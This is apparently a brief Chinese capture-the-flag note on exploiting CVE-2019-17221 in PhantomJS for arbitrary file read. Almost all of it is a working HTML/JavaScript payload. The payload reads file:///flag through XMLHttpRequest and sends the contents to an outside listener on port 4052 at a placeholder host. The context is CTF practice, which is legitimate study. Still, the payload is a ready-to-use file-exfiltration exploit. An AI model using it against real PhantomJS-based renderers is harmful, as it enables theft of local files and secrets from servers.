tags:: CTFWEB/PhantomJS

- # 思路
	- PhantomJS打CVE-2019-17221做文件任意读取
- # PhantomJS文件任意读取
	- ```html
	  <!DOCTYPE html>
	  <html lang="en">
	  <head>
	      <meta charset="UTF-8">
	      <meta name="viewport" content="width=device-width, initial-scale=1.0">
	      <title>Document</title>
	  </head>
	  <body>
	      <script>
	          x = new XMLHttpRequest;
	          x.onload = function(){
	              x = new XMLHttpRequest;
	              x.open("GET", "http://xxx:4052/?p=" + encodeURIComponent(this.responseText))
	              x.send();
	              document.write(this.responseText)
	          }
	          x.open("GET", "file:///flag")
	          x.send();
	      </script>
	  </body>
	  </html>
	  ```